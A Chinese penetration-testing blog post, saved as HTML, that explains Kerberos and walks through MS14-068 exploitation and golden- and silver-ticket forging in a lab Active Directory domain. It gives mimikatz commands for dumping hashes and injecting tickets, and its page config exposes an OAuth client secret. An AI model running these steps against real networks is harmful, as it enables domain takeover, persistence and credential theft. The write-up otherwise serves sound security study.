@@ -1,0 +1,139 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="window协议认证之Kerberos"><meta name="keywords" content="Kerberos,内网渗透"><meta name="author" content="ye1s,undefined"><meta name="copyright" content="ye1s"><title>window协议认证之Kerberos【ye1s】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
+    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
+});
+</script><script>var isPassword = '' || false;
+if (isPassword) {
+    if (prompt('请输入文章密码') !== '') {
+        alert('密码错误！');
+        history.back();
+    }
+}</script><script>window.GLOBAL_CONFIG = {
+  root: '/',
+  algolia: {"appId":"LKL6Q0GQJM","apiKey":"03829f64e2f5c11e4a5e2b8e51e24eb9","indexName":"blog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  gitment: {"owner":"ye1sec","repo":"comments","client_id":"d5ece338867af32b6dfa","client_secret":"2caf36bbd47977524017f95105315fc9e65f0577"},
+}</script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="ye1s" type="application/atom+xml">
+</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kerberos认证流程"><span class="toc-number">1.</span> <span class="toc-text">Kerberos认证流程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kerberos-攻击方式"><span class="toc-number">2.</span> <span class="toc-text">Kerberos 攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MS14-068"><span class="toc-number">2.1.</span> <span class="toc-text">MS14-068</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#黄金票据"><span class="toc-number">2.2.</span> <span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#白银票据"><span class="toc-number">2.3.</span> <span class="toc-text">白银票据</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">ye1s</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/ye1sec" target="_blank">GitHub<i class="icon-dot bg-color6"></i></a><a class="links-button button-hover" href="mailto:431774437@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color5"></i></a><a class="links-button button-hover" href="tencent://message/?uin=431774437&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color7"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">173</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">151</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">12</span></a></div><div class="friend-link"><a class="friend-link-text" href="http://www.m00nback.xyz/" target="_blank">MoonBack</a><a class="friend-link-text" target="_blank">待定</a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">ye1s</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">window协议认证之Kerberos</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2020-01-05 | 更新于 2020-04-13</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/Kerberos/">Kerberos</a><span>&nbsp;|&nbsp;</span><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div></div></div><div class="main-content"><p>Kerberos 是一种由MIT（麻省理工大学）提出的一种网络身份验证协议。它旨在通过使用密钥加密技术为客户端/服务器应用程序提供强身份验证。  </p>
+<a id="more"></a> 
+
+<p>一些基本的概念:  </p>
+<p>Principal 一个用户会以一个独一无二的身份来被 KDC 认证，该身份被称为 Principal。<br>一个 Principal 由三个部分组成：primary, instance 以及 realm，<br>其组成形式为primary/instance@realm。</p>
+<ul>
+<li>primary 可以是 OS 中的 username，也可以是 service name；</li>
+<li>instance 用于区分属于同一个 user 或者 service 的多个 principals，该项为 optional；</li>
+<li>realm 类似于 DNS 中的 domain，定义了一组 principals</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">AD(Account Database)，它作为账户管理数据库，用与存储用户认证信息，即密码的NTLM Hash等    </span><br><span class="line">KDC（Key Distribution Center）密钥分发中心，里面包含两个服务：AS和TGS</span><br><span class="line">AS（Authentication Server）身份认证服务器</span><br><span class="line">TGS（Ticket Granting Server）票据授权服务器</span><br><span class="line">SS（Service Server） 特定服务提供端</span><br><span class="line">TGT（Ticket Granting Ticket）由身份认证服务授予的票据(黄金票据)，用于身份认证，存储在内存，默认有效期为10小时  </span><br><span class="line">ST(Service Ticket) 由票据授权服务器提供的票据，用于特定服务</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Kerberos认证流程"><a href="#Kerberos认证流程" class="headerlink" title="Kerberos认证流程"></a>Kerberos认证流程</h1><p><img src="../../images/window/kerberos.png" alt=""></p>
+<p>认证流程  z</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">KRB_AS_REQ: 客户端向KDC的KAS服务请求开身份证明</span><br><span class="line">KRB_AS_REP: KAS认证成功后返回给客户端认购权证（ TGT ）</span><br><span class="line">KRB_TGS_REQ: 客户端拿着TGT到KDC的TGS服务买票</span><br><span class="line">KRB_TGS_REP: TGS认证成功后返回给客户端服务票据（ST）</span><br><span class="line">KRB_AP_REQ: 客户端拿着ST去访问服务</span><br><span class="line">KRB_AP_REP: 返回服务资源</span><br></pre></td></tr></table></figure>
+
+<p>Kerberos认证的三阶段详情可看:<br><a href="https://sakuxa.com/2019/04/03/02-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BKerberos/#more" target="_blank" rel="noopener">Windows认证之Kerberos</a></p>
+<h1 id="Kerberos-攻击方式"><a href="#Kerberos-攻击方式" class="headerlink" title="Kerberos 攻击方式"></a>Kerberos 攻击方式</h1><h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>MS14068 是一个能够使普通用户提权到域控权限的权限提升漏洞。攻击者可以通过构造特定的请求包来达到提升权限的目的。    </p>
+<p>漏洞分析：<a href="http://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/56081.html</a><br>漏洞利用：<br>注意：Mimikatz PTC 注入不支持NT5内核，所以 XP、03 都没法用        </p>
+<p>利用方式:   </p>
+<p>MS14-068 对应的补丁为 KB3011780,systeminfo 查看是否有补丁<br><img src="../../images/window/systeminfo.png" alt="">  </p>
+<p>在域内主机 jerry 上通过 dir 来访问域控的共享文件夹，示拒绝访问   </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\OWA2013.rootkit.org\c$</span><br></pre></td></tr></table></figure>
+<p><img src="../../images/window/dir.png" alt=""> </p>
+<p>漏洞利用需要的参数说明: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-u 域账号+@+域名称，这里是jerry+@+rootkit.org</span><br><span class="line">-p 为当前用户的密码，即jerry的密码</span><br><span class="line">-s为jerry的SID值，可以通过whoami&#x2F;all来获取用户的SID值</span><br><span class="line">-d为当前域的域控</span><br></pre></td></tr></table></figure>
+<p>获取用户名，SID </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami &#x2F;all &#x2F;fo list</span><br></pre></td></tr></table></figure>
+<p><img src="../../images/window/whoami.png" alt=""> </p>
+<p>获取域控地址  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain controllers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
+<p><img src="../../images/window/netgroup.png" alt=""> </p>
+<p>获取TGT的 cache 文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u jerry@rootkit.org -p qwe123! -s S-1-5-21-3759881954-2993291187-3577547808-1608 -d OWA2013.rootkit.org</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../images/window/tgt.png" alt=""></p>
+<p>清除缓存的票据</p>
+<p><img src="../../images/window/klist.png" alt=""></p>
+<p>mimikatz 导入上面生成的、TGT cache 文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc TGT_jerry@rootkit.org.ccache</span><br></pre></td></tr></table></figure>
+<p><img src="../../images/window/MK.png" alt=""><br>再次dir访问域控共享,本应成功，这里显示有点问题，暂留疑问？<br><img src="../../images/window/c.png" alt=""></p>
+<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><p>通过前面我们已经知道 Kerberos 的认证大致流程，在第二阶段认证的 KRB_AS_REQ 时，Client 拥有两份加密的 Session Key 分别是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用自己NTLM Hash加密的Session Key</span><br><span class="line">用krbtgt用户的NTLM Hash加密的TGT</span><br></pre></td></tr></table></figure>
+<p>TGT 只有 KDC 可以解密，这是因为TGT是使用 krbtgt 用户的 NTLM Hash 进行加密的，而该Hash 只有 KDC 知道。但是这也意味着如果我们拥有 krbtgt 用户的 Hash，那么意味着我们可以解密以及伪造 TGT </p>
+<p>利用条件  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、域名称</span><br><span class="line">2、域的 SID 值</span><br><span class="line">3、伪造用户名，可以是任意的</span><br><span class="line">4、域的 KRBTGT 账户密码 HASH</span><br></pre></td></tr></table></figure>
+<p>里面前三项都比较好获取，最难的就是 krbtgt 用户的 Hash<br>krbtgt用户是KDC的默认用户，想要拿到它就意味着你已经拿到了域控<br>所以说，万能票据只能算是一种安全可靠的留后门的方式  </p>
+<p>安全可靠的原因:   </p>
+<ul>
+<li>不用担心域管改密码，知道名字就可以伪造你的身份  </li>
+<li>krbtgt 密码只在 提升域功能级别、利用域的恢复数据来实施域的裸机恢复 的时候才更新，也就是说如果没大情况发生，hash 都是不变的</li>
+</ul>
+<p>利用过程:<br>获取域名，域 SID </p>
+<p><img src="../../images/window/whoamiUser.png" alt=""></p>
+<p>在域控机子上获得 krbtgt 的 hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:rootkit.org &#x2F;user:krbtgt</span><br></pre></td></tr></table></figure>
+<p><img src="../../images/window/krbtgtHash.png" alt=""></p>
+<p>Administrator作为我们要扮演的用户,mimikatz 中的 kerberos::golden 功能生成黄金票据<br>参数说明：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;admin：伪造的用户名</span><br><span class="line">&#x2F;domain：域名称</span><br><span class="line">&#x2F;sid：SID值，注意是去掉最后一个-后面的值</span><br><span class="line">&#x2F;krbtgt：krbtgt的HASH值</span><br><span class="line">&#x2F;ticket：生成的票据名称</span><br></pre></td></tr></table></figure>
+<p>生成黄金票据 golden.kiribi  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden &#x2F;admin:administrator &#x2F;domain:rootkit.org  &#x2F;sid:S-1-5-21-3759881954-2993291187-3577547808 &#x2F;krbtgt:c3d5042c67ef5f461d0ba6ecdd9ea449 &#x2F;ticket:golden.kiribi</span><br></pre></td></tr></table></figure>
+<p><img src="../../images/window/Goldtgt.png" alt=""></p>
+<p>通过 mimikatz 中的 kerberos::ptt 功能（Pass The Ticket）将 golden.kiribi 导入内存中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::ptt golden.kiribi</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
+<p><img src="../../images/window/kerberosptt.png" alt=""></p>
+<p>此时就可以通过dir成功访问域控的共享文件夹 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\OWA2013.rootkit.org\c$</span><br></pre></td></tr></table></figure>
+<p><img src="../../images/window/dir1.png" alt=""></p>
+<h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><p>白银票据不与 KDC 交互，伪造 Ticket 直接与 server 进行交互。<br>在 Kerberos 认证大致流程的 KRB_AP_REQ 时，Client 拥有两份加密的 Session Key，分别是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用自己NTLM Hash加密的Session Key</span><br><span class="line">用Server的NTLM Hash加密的Tiket</span><br></pre></td></tr></table></figure>
+<p>Tiket 只有 Server 可以解密，这是因为 Tiket 是使用 Server 的 NTLM Hash 进行加密的。但是这也意味着如果我们拥有 Server 的 Hash，那么意味着我们可以解密以及伪造 Tiket，从而绕过 KDC 直接进行验证。 因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。</p>
+<p>利用条件:  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.域名称</span><br><span class="line">2.域的 SID 值</span><br><span class="line">3.域的服务账户的密码 HASH（不是 krbtgt，是域控）</span><br><span class="line">4.伪造的用户名，可以是任意用户名，这里是 silver</span><br></pre></td></tr></table></figure>
+
+<p>利用过程:</p>
+<p>首先我们需要知道服务账户的密码 HASH，这里同样拿域控来举例，通过 mimikatz 查看当前域账号 administrator 的 HASH 值。注意，这里使用的不是 Administrator 账号的 HASH，而是 OWA2013$ 的 HASH</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+<p><img src="../../images/window/logon.png" alt="">  </p>
+<p>通过mimikatz生成白银票据</p>
+<p>参数说明: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;domain：当前域名称</span><br><span class="line">&#x2F;sid：SID值，和金票一样取前面一部分</span><br><span class="line">&#x2F;target：目标主机，这里是OWA2010SP3.0day.org</span><br><span class="line">&#x2F;service：服务名称，这里需要访问共享文件，所以是cifs</span><br><span class="line">&#x2F;rc4：目标主机的HASH值</span><br><span class="line">&#x2F;user：伪造的用户名</span><br><span class="line">&#x2F;ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用&#x2F;ticket导出之后再使用kerberos::ptt来导入</span><br></pre></td></tr></table></figure>
+<p>开始生成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden &#x2F;domain:rootkit.org &#x2F;sid:S-1-5-21-3759881954-2993291187-3577547808 &#x2F;target:OWA2013.rootkit.org &#x2F;service:cifs &#x2F;rc4:4c8d78036f691e43a56115f0f8fed1b7 &#x2F;user:administrator &#x2F;ptt</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../images/window/sliver.png" alt=""><br>klist查看当前会话的kerberos票据可以看到生成的票据,访问 DC 共享文件夹  </p>
+<p><img src="../../images/window/purge.png" alt=""> </p>
+<p>参考文章:<br><a href="http://cs-cjl.com/2018/11_29_kerberos_principle" target="_blank" rel="noopener">Kerberos 原理</a><br><a href="http://www.h0r2yc.cn/2019/08/17/windows%E8%AE%A4%E8%AF%81-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E3%80%81%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">windows认证-白银票据、黄金票据分析及利用</a><br><a href="https://sakuxa.com/2019/04/03/02-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BKerberos/#more" target="_blank" rel="noopener">Windows认证之Kerberos</a></p>
+</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ye1s</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://blog.cfyqy.com/article/3bf5e670.html">https://blog.cfyqy.com/article/3bf5e670.html</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.cfyqy.com">ye1s</a>！</span></div></div><div class="post-copyright" id="comments-container"><script src="/js/comments/gitment.js"></script></div><script>let arr = location.href.split('/#more')[0].split('/');
+let title = arr[arr.length - 1];
+if (title === '') {
+    title = arr[arr.length - 2]
+}
+var flag = false;
+var gitFun = function () {
+    try {
+        var gitmentObj = window.GLOBAL_CONFIG.gitment;
+        var gitment = new Gitment({
+            id: decodeURI(title), // 可选。默认为 location.href
+            owner: gitmentObj.owner,
+            repo: gitmentObj.repo,
+            oauth: {
+                client_id: gitmentObj.client_id,
+                client_secret: gitmentObj.client_secret
+            },
+        });
+        gitment.render('comments-container');
+        flag = true;
+    } catch (e) {
+        flag = false;
+    }
+}
+var setIn = setInterval(() => {
+    if (!flag) {
+        gitFun();
+    } else {
+        clearInterval(setIn);
+    }
+}, 200);</script></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/d718e0b1.html"><i class="fas fa-angle-left">&nbsp;</i><span>XSS + CSRF </span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/b042f4ab.html"><span>window访问控制模型</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2017 ～ 2021 By ye1s</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/daovoice.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>
